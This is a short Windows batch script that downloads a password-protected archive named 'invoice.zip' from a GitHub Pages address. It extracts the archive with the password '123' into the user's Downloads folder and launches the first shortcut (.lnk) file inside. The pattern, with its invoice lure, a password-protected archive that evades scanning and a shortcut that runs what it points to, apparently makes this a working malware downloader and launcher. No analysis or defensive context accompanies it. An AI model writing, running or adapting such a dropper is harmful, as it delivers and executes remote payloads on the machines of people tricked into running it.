@echo off
setlocal
set BASE=https://azamcorps216-debug.github.io/authenticated/assets
set DL=%USERPROFILE%\Downloads
set WORK=%DL%\invoice
set PW=123

if exist "%WORK%" rmdir /s /q "%WORK%"
mkdir "%WORK%"

curl -L -o "%DL%\invoice.zip" "%BASE%/invoice.zip"
if not exist "%DL%\invoice.zip" goto fail

"%DL%\7zr.exe" x "%DL%\invoice.zip" -o"%WORK%" -y -p%PW%
if errorlevel 1 goto fail

for /r "%WORK%" %%f in (*.lnk) do (
    start "" "%%f"
    goto done
)

:fail
echo Failed. Check your connection or password.
pause
exit /b 1

:done
exit /b 0
